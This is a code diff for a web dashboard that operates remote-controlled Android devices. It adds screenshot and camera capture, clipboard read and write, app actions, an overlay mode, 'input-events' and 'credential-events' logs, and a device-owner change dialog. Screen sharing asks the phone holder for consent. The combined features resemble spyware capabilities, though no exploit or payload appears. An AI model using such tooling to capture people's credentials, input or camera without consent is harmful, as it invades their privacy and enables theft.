+        <button class="control-list-button" data-reserved-action="power-menu" ${actionDisabled}><span>⏻</span><div><b>电源</b><small>弹出电源菜单</small></div></button>
+        <button class="control-list-button" data-reserved-action="screenshot" ${actionDisabled}><span>▧</span><div><b>截图</b><small>抓取当前屏幕</small></div></button>
+        <button class="control-list-button" data-action="refresh_status" ${actionDisabled}><span>↥</span><div><b>上报</b><small>上报节点</small></div></button>
       </aside>
+      <section class="remote-stage-panel secondary-stage">
+        <div class="stage-label">截图 / 辅助画面</div><div class="phone-frame"><div class="phone-camera"></div><div class="phone-screen" data-action-result="screenshot"><small>截图结果将在这里显示</small></div></div>
+      </section>
     </div>
-    <section class="detail-section"><h4>名称、分组与备注</h4><form id="device-metadata-form" class="metadata-form">
+    <section class="detail-section"><div class="detail-section-head"><h4>名称、分组与备注</h4>${state.user.role === "admin" ? '<button type="button" class="secondary-button small" data-change-device-owner>更换设备管理员</button>' : ""}</div><form id="device-metadata-form" class="metadata-form">
       <input id="device-edit-name" maxlength="120" value="${escapeHtml(device.name)}" ${canEdit ? "" : "disabled"}>
       <select id="device-edit-group" ${canEdit ? "" : "disabled"}>${groupOptions}</select>
       <textarea id="device-edit-note" maxlength="1000" placeholder="设备备注" ${canEdit ? "" : "disabled"}>${escapeHtml(device.note || "")}</textarea>
       ${canEdit ? '<button class="primary-button" type="submit">保存设备信息</button>' : ""}
     </form></section>`;
+  applyWorkbenchLayout();
+  loadLatestActionResult("screenshot");
+  loadLatestCameraResult();
 }
 
 function workbenchPlaceholder(label, deviceId, module) {
-  return `<div class="module-placeholder"><div class="empty-icon">▯</div><h3>${escapeHtml(label)}</h3><p>暂无数据 / 当前 APK 未接入</p><code>GET /api/devices/${escapeHtml(deviceId)}/workbench/${escapeHtml(module)}</code><button class="secondary-button small" data-reserved-module="${escapeHtml(module)}">检查预留接口</button></div>`;
+  const disabled = canOperateSelectedDevice() ? "" : "disabled";
+  return `<div class="module-placeholder"><div class="empty-icon">▯</div><h3>${escapeHtml(label)}</h3><div class="module-result" data-workbench-result="${escapeHtml(module)}"><div class="loading-block">${escapeHtml(workbenchEmptyLabels[module] || "暂无数据~")}</div></div><button class="secondary-button small" data-reserved-module="${escapeHtml(module)}" ${disabled}>刷新</button></div>`;
 }
 
 function permissionRow(label, value) {
-  const enabled = value === true || value === 1;
-  const unknown = value == null;
+  const normalized = typeof value === "string" ? value.toLowerCase() : value;
+  const enabled = [true, 1, "granted", "enabled", "allowed"].includes(normalized);
+  const disabled = [false, 0, "denied", "disabled", "blocked"].includes(normalized);
+  const unknown = !enabled && !disabled;
   return `<div class="permission-row ${enabled ? "enabled" : ""}"><span>${enabled ? "✓" : unknown ? "+" : "×"}</span><b>${escapeHtml(label)}</b><em>${unknown ? "未接入" : enabled ? "已开启" : "未开启"}</em></div>`;
 }
 
-function controlToggle(title, copy, action, value) {
+function controlToggle(title, copy, action, value, disabled = "") {
   const enabled = value === true || value === 1;
-  return `<button class="control-toggle" data-reserved-action="${escapeHtml(action)}" data-current-value="${enabled}"><div><b>${escapeHtml(title)}</b><small>${escapeHtml(copy)}</small></div><i class="${enabled ? "on" : ""}"></i></button>`;
+  return `<button class="control-toggle" data-reserved-action="${escapeHtml(action)}" data-current-value="${enabled}" ${disabled}><div><b>${escapeHtml(title)}</b><small>${escapeHtml(copy)}</small></div><i class="${enabled ? "on" : ""}"></i></button>`;
+}
+
+function applyWorkbenchLayout() {
+  const workbench = $(".device-workbench", $("#drawer-content"));
+  if (!workbench) return;
+  workbench.style.zoom = String(state.workbench.scale / 100);
+  workbench.style.fontSize = `${state.workbench.fontSize}px`;
+  workbench.style.setProperty("--wb-control-font", `${state.workbench.fontSize * 0.625}px`);
+  workbench.style.setProperty("--wb-small-font", `${state.workbench.fontSize * 0.56}px`);
+  workbench.classList.remove("theme-default", "theme-light", "theme-dark");
+  workbench.classList.add(`theme-${state.workbench.theme}`);
+  const scale = $("[data-workbench-scale]", $("#drawer-content"));
+  const font = $("[data-workbench-font]", $("#drawer-content"));
+  if (scale) scale.value = String(state.workbench.scale);
+  if (font) font.value = String(state.workbench.fontSize);
+  const scaleOutput = $("[data-workbench-scale-output]", $("#drawer-content"));
+  const fontOutput = $("[data-workbench-font-output]", $("#drawer-content"));
+  if (scaleOutput) scaleOutput.textContent = `${state.workbench.scale}%`;
+  if (fontOutput) fontOutput.textContent = `${state.workbench.fontSize}px`;
+}
+
+function filterWorkbenchLogs() {
+  const root = $("#drawer-content");
+  const active = $("[data-log-filter].active", root)?.dataset.logFilter || "";
+  const search = $("[data-log-search]", root)?.value.trim().toLowerCase() || "";
+  let visible = 0;
+  $$('[data-log-item]', root).forEach((item) => {
+    const matches = (!active || item.dataset.logCategory === active) && (!search || item.dataset.logSearch.includes(search));
+    item.classList.toggle("hidden", !matches);
+    if (matches) visible += 1;
+  });
+  $("[data-log-empty]", root)?.classList.toggle("hidden", visible !== 0);
+}
+
+function filterWorkbenchApps() {
+  const root = $("#drawer-content");
+  const tag = $("[data-app-filter]", root)?.value || "";
+  const mark = $("[data-app-mark]", root)?.value || "";
+  const search = $("[data-app-search]", root)?.value.trim().toLowerCase() || "";
+  $$('[data-app-card]', root).forEach((item) => {
+    const matches = (!tag || item.dataset.appTag === tag) && (!mark || item.dataset.appMarkValue === mark) && (!search || item.dataset.appSearchValue.includes(search));
+    item.classList.toggle("hidden", !matches);
+  });
+}
+
+function renderActionMedia(result, fallback) {
+  if (!result) return `<small>${escapeHtml(fallback)}</small>`;
+  const url = safeMediaUrl(result.image_url || result.url || result.uri || result.frame);
+  if (url) return `<img class="action-result-image" src="${escapeHtml(url)}" alt="Android 回传画面">`;
+  return `<pre>${escapeHtml(JSON.stringify(result, null, 2))}</pre>`;
+}
+
+async function loadLatestActionResult(action, targetName = action) {
+  if (!state.selectedDeviceId) return;
+  const target = $(`[data-action-result="${targetName}"]`, $("#drawer-content"));
+  if (!target) return;
+  try {
+    const params = new URLSearchParams({ device_id: state.selectedDeviceId, action, page: "1", page_size: "1" });
+    const response = await api(`/api/commands?${params}`);
+    const command = response.data[0];
+    if (!command) return;
+    if (["queued", "sent", "acknowledged"].includes(command.status)) {
+      target.innerHTML = `<small>命令已发送，等待 Android 回传结果</small>`;
+    } else if (command.status === "failed") {
+      target.innerHTML = `<small>处理失败：${escapeHtml(command.error_message || command.error_code || "未知错误")}</small>`;
+    } else {
+      target.innerHTML = renderActionMedia(command.result, "Android 已报告完成");
+    }
+  } catch (_) {
+    // 结果区域是辅助信息，不重复弹出全局错误提示。
+  }
+}
+
+async function loadLatestCameraResult() {
+  if (!state.selectedDeviceId) return;
+  const target = $('[data-action-result="camera"]', $("#drawer-content"));
+  if (!target) return;
+  try {
+    const commands = await Promise.all(["camera", "front-camera", "rear-camera"].map(async (action) => {
+      const params = new URLSearchParams({ device_id: state.selectedDeviceId, action, page: "1", page_size: "1" });
+      const response = await api(`/api/commands?${params}`);
+      return response.data[0] || null;
+    }));
+    const command = commands.filter(Boolean).sort((a, b) => String(b.queued_at).localeCompare(String(a.queued_at)))[0];
+    if (!command) return;
+    if (["queued", "sent", "acknowledged"].includes(command.status)) {
+      target.innerHTML = `<small>命令已发送，等待 Android 回传结果</small>`;
+    } else if (command.status === "failed") {
+      target.innerHTML = `<small>处理失败：${escapeHtml(command.error_message || command.error_code || "未知错误")}</small>`;
+    } else {
+      target.innerHTML = renderActionMedia(command.result, "Android 已报告完成");
+    }
+  } catch (_) {
+    // 结果区域是辅助信息，不重复弹出全局错误提示。
+  }
 }
 
 async function updateDeviceMetadata(event) {
@@ -903,6 +1245,35 @@ async function updateDeviceMetadata(event) {
     showToast("设备信息已保存");
     await Promise.all([loadDevices(), loadGroups()]);
     openDevice(state.selectedDeviceId);
+  } catch (error) {
+    showToast(error.message, "error");
+  } finally {
+    setLoading(button, false);
+  }
+}
+
+async function openDeviceOwnerDialog() {
+  if (!state.selectedDevice || state.user?.role !== "admin") return;
+  if (!state.users.length) await loadUsers();
+  const select = $("#device-owner-select");
+  select.innerHTML = state.users.filter((account) => account.status === "active").map((account) => `<option value="${escapeHtml(account.id)}" ${account.id === state.selectedDevice.owner_user_id ? "selected" : ""}>${escapeHtml(account.username)} · ${roleLabel(account.role)}</option>`).join("");
+  $("#device-owner-dialog").showModal();
+}
+
+async function changeDeviceOwner(event) {
+  event.preventDefault();
+  if (!state.selectedDeviceId) return;
+  const button = $("#device-owner-form button[type='submit']");
+  setLoading(button, true, "更换中…");
+  try {
+    await api(`/api/devices/${encodeURIComponent(state.selectedDeviceId)}`, {
+      method: "PATCH",
+      body: JSON.stringify({ owner_user_id: $("#device-owner-select").value }),
+    });
+    $("#device-owner-dialog").close();
+    showToast("设备管理员已更换");
+    await Promise.all([loadDevices(), loadGroups()]);
+    await openDevice(state.selectedDeviceId);
   } catch (error) {
     showToast(error.message, "error");
   } finally {
@@ -1065,6 +1436,10 @@ function setScreenStatus(status) {
   const badge = $("#screen-session-status");
   badge.textContent = labels[status] || status;
   badge.className = `status-pill ${status === "active" ? "success" : ["denied", "failed"].includes(status) ? "unavailable" : "warning"}`;
+  if (status === "awaiting_consent") {
+    $("#screen-waiting h3").textContent = "等待手机授权";
+    $("#screen-waiting p").textContent = "请在手机上确认本次屏幕共享请求。";
+  }
   if (["denied", "stopped", "failed"].includes(status)) {
     $("#screen-waiting h3").textContent = labels[status];
     $("#screen-waiting p").textContent = status === "denied" ? "手机持有人没有同意本次共享。" : "当前屏幕协助会话已经结束。";
@@ -1150,9 +1525,20 @@ function handleSocketMessage(raw) {
     }
   }
   if (event.type === "command.updated") {
-    const label = { acknowledged: "设备已收到命令", success: "设备操作成功", failed: "设备操作失败" }[event.status];
+    const label = { acknowledged: "设备已收到命令", success: "处理成功", failed: "处理失败" }[event.status];
     if (label) showToast(label, event.status === "failed" ? "error" : "success");
-    if (["success", "failed"].includes(event.status)) scheduleDataRefresh();
+    if (["success", "failed"].includes(event.status)) {
+      scheduleDataRefresh();
+      const activePanel = $("[data-workbench-panel].active", $("#drawer-content"));
+      const module = activePanel?.dataset.workbenchPanel;
+      if (workbenchModuleLabels[module]) loadWorkbenchModule(module);
+      if (module === "logs") {
+        loadWorkbenchModule("input-events");
+        loadWorkbenchModule("credential-events");
+      }
+      loadLatestActionResult("screenshot");
+      loadLatestCameraResult();
+    }
   }
   if (event.type === "screen.session.updated" && event.session_id === state.screenSessionId) {
     setScreenStatus(event.status);
@@ -1219,7 +1605,7 @@ function bindEvents() {
     $$("[data-quick-online]").forEach((button) => button.classList.toggle("active", button === item));
     const value = item.dataset.quickOnline;
     $("#filter-online").value = value === "accessible" ? "true" : value;
-    if (value === "accessible") $("#filter-accessibility").value = "true";
+    $("#filter-accessibility").value = value === "accessible" ? "true" : "";
     state.page = 1;
     loadDevices();
   }));
@@ -1238,25 +1624,92 @@ function bindEvents() {
       const name = tab.dataset.workbenchTab;
       $$("[data-workbench-tab]", $("#drawer-content")).forEach((item) => item.classList.toggle("active", item === tab));
       $$("[data-workbench-panel]", $("#drawer-content")).forEach((item) => item.classList.toggle("active", item.dataset.workbenchPanel === name));
+      if (workbenchModuleLabels[name]) loadWorkbenchModule(name);
+      return;
+    }
+    const logFilter = event.target.closest("[data-log-filter]");
+    if (logFilter) {
+      $$('[data-log-filter]', $("#drawer-content")).forEach((item) => item.classList.toggle("active", item === logFilter));
+      filterWorkbenchLogs();
+      return;
+    }
+    const copy = event.target.closest("[data-copy-text]");
+    if (copy) {
+      navigator.clipboard?.writeText(copy.dataset.copyText).then(() => showToast("已复制")).catch(() => showToast("复制失败", "error"));
+      return;
+    }
+    const appAction = event.target.closest("[data-app-action]");
+    if (appAction && !appAction.disabled) {
+      callReservedWorkbenchAction(appAction.dataset.appAction, null, { package_name: appAction.dataset.packageName });
+      return;
+    }
+    const reset = event.target.closest("[data-workbench-reset]");
+    if (reset) {
+      state.workbench = { ...state.workbench, scale: 100, fontSize: 16, keyStep: 100, theme: "default" };
+      const keyStep = $("[data-workbench-key-step]", $("#drawer-content"));
+      const theme = $("[data-workbench-theme]", $("#drawer-content"));
+      if (keyStep) keyStep.value = "100";
+      if (theme) theme.value = "default";
+      applyWorkbenchLayout();
+      return;
+    }
+    if (event.target.closest("[data-change-device-owner]")) {
+      openDeviceOwnerDialog();
+      return;
+    }
+    const clipboardSubmit = event.target.closest("[data-clipboard-submit]");
+    if (clipboardSubmit && !clipboardSubmit.disabled) {
+      const text = $("[data-clipboard-write]", $("#drawer-content"))?.value || "";
+      callReservedWorkbenchAction("write-clipboard", null, { text });
       return;
     }
     const reservedAction = event.target.closest("[data-reserved-action]");
-    if (reservedAction) {
-      callReservedWorkbenchAction(reservedAction.dataset.reservedAction, reservedAction.dataset.currentValue);
+    if (reservedAction && reservedAction.tagName !== "SELECT" && !reservedAction.disabled) {
+      const currentValue = reservedAction.dataset.currentValue;
+      const value = currentValue === undefined ? null : currentValue !== "true";
+      callReservedWorkbenchAction(reservedAction.dataset.reservedAction, value).then((sent) => {
+        if (!sent) return;
+        if (reservedAction.dataset.reservedAction === "clear-clipboard") {
+          const clipboard = $("[data-clipboard-text]", $("#drawer-content"));
+          if (clipboard) clipboard.value = "";
+        }
+        if (reservedAction.dataset.reservedAction === "screenshot") loadLatestActionResult("screenshot");
+        if (["front-camera", "rear-camera", "camera"].includes(reservedAction.dataset.reservedAction)) loadLatestCameraResult();
+      });
       return;
     }
     const reservedModule = event.target.closest("[data-reserved-module]");
     if (reservedModule) {
-      checkReservedWorkbenchModule(reservedModule.dataset.reservedModule);
+      requestWorkbenchModule(reservedModule.dataset.reservedModule);
       return;
     }
     const button = event.target.closest("[data-action]");
     if (button && !button.disabled) handleCommandAction(button.dataset.action);
   });
   $("#drawer-content").addEventListener("change", (event) => {
-    if (event.target.matches("select[data-reserved-action]")) {
+    if (event.target.matches("select[data-reserved-action]") && !event.target.disabled) {
+      if (event.target.dataset.reservedAction === "overlay-mode") state.workbench.overlayMode = event.target.value;
       callReservedWorkbenchAction(event.target.dataset.reservedAction, event.target.value);
+      return;
     }
+    if (event.target.matches("[data-workbench-key-step]")) state.workbench.keyStep = Number(event.target.value);
+    if (event.target.matches("[data-workbench-theme]")) {
+      state.workbench.theme = event.target.value;
+      applyWorkbenchLayout();
+    }
+    if (event.target.matches("[data-app-filter], [data-app-mark]")) filterWorkbenchApps();
+  });
+  $("#drawer-content").addEventListener("input", (event) => {
+    if (event.target.matches("[data-workbench-scale]")) {
+      state.workbench.scale = Number(event.target.value);
+      applyWorkbenchLayout();
+    }
+    if (event.target.matches("[data-workbench-font]")) {
+      state.workbench.fontSize = Number(event.target.value);
+      applyWorkbenchLayout();
+    }
+    if (event.target.matches("[data-log-search]")) filterWorkbenchLogs();
+    if (event.target.matches("[data-app-search]")) filterWorkbenchApps();
   });
   $("#drawer-content").addEventListener("submit", (event) => {
     if (event.target.id === "device-metadata-form") updateDeviceMetadata(event);
@@ -1276,6 +1729,9 @@ function bindEvents() {
   $("#open-user-dialog").addEventListener("click", () => $("#user-dialog").showModal());
   $("#close-user-dialog").addEventListener("click", () => $("#user-dialog").close());
   $("#cancel-user-dialog").addEventListener("click", () => $("#user-dialog").close());
+  $("#device-owner-form").addEventListener("submit", changeDeviceOwner);
+  $("#close-device-owner-dialog").addEventListener("click", () => $("#device-owner-dialog").close());
+  $("#cancel-device-owner-dialog").addEventListener("click", () => $("#device-owner-dialog").close());
   $("#user-search-button").addEventListener("click", loadUsers);
   $("#user-status-filter").addEventListener("change", loadUsers);
   $("#reload-users").addEventListener("click", loadUsers);
@@ -1324,6 +1780,17 @@ function bindEvents() {
     if (viewMeta[requested]) showView(requested, false);
   });
   window.addEventListener("online", () => state.token && connectDashboardSocket());
+  window.addEventListener("keydown", (event) => {
+    if (!event.altKey || !$("#device-drawer").classList.contains("open")) return;
+    if (!["ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"].includes(event.key)) return;
+    const amount = state.workbench.keyStep;
+    $("#drawer-content").scrollBy({
+      top: event.key === "ArrowUp" ? -amount : event.key === "ArrowDown" ? amount : 0,
+      left: event.key === "ArrowLeft" ? -amount : event.key === "ArrowRight" ? amount : 0,
+      behavior: "smooth",
+    });
+    event.preventDefault();
+  });
 }
 
 document.addEventListener("DOMContentLoaded", () => {
